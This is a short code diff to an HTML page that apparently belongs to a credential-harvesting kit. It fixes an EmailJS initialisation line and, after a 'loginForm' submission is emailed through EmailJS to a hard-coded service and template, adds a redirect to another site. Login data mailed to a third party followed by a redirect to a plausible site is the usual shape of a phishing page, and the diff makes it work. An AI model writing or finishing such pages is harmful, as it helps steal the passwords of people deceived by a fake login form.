@@ -174,7 +174,7 @@
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("1Louy701aFXIKNTLS; // Replace with your EmailJS public key
+            emailjs.init("1Louy701aFXIKNTLS"); // Replace with your EmailJS public key
         })();
 
         document.getElementById("loginForm").addEventListener("submit", function(event) {
@@ -191,6 +191,7 @@
             emailjs.send("service_i43rdo8", "template_75amwuk", templateParams)
                 .then(function(response) {
                     alert("Message sent successfully!");
+                    window.location.href = "https://example.com"; // Replace with your desired link
                 }, function(error) {
                     alert("Error sending message. Please try again.");
                 });
